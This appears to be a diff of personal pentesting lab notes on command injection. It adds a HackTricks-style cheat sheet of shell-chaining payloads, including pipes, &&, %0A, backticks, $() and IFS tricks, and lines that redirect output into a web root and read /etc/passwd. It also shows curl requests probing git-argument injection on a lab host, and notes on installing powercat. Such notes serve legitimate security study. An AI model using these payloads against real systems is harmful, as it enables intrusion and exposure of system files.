@@ -1,7 +1,28 @@
 
 [Command Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection)
-**START SMALL FIRST**
+
+
+### START SMALL FIRST
+
+#Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id # Execute both
+ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
+ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
+ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
+ls %0A id # %0A Execute both (RECOMMENDED)
+
+#Only unix supported
+`ls` # ``
+$(ls) # $()
+ls; id # ; Chain commands
+ls${LS_COLORS:10:1}${IFS}id # Might be useful
+
+#Not executed but may be interesting
+> /var/www/html/out.txt #Try to redirect the output to a file
+< /etc/passwd #Try to send some input to the command
 move from there.
+
+### USING CURL TO SEND CMD INJECTIONS
 
 You can see us trying to submit a git clone repository
 ![[Pasted image 20230929103823.png]]
@@ -17,7 +38,7 @@ Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
 IT IS ACCEPTING GIT
 ──(hollacosta㉿kali1)-[~]
 └─$ curl -X POST --data 'Archive=**git**' http://192.168.231.189:8000/archive
-An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
+An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C ] [-c <name>=<value>]
            [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
            [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
            [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
@@ -62,7 +83,7 @@ See 'git help git' for an overview of the system.
 PowerShell
 
 
-**INSTALL POWERCAT (POWERSHELL+NETCAT FOR KALI)**
+### INSTALL POWERCAT (POWERSHELL+NETCAT FOR KALI)
 
 sudo apt install powercat
 
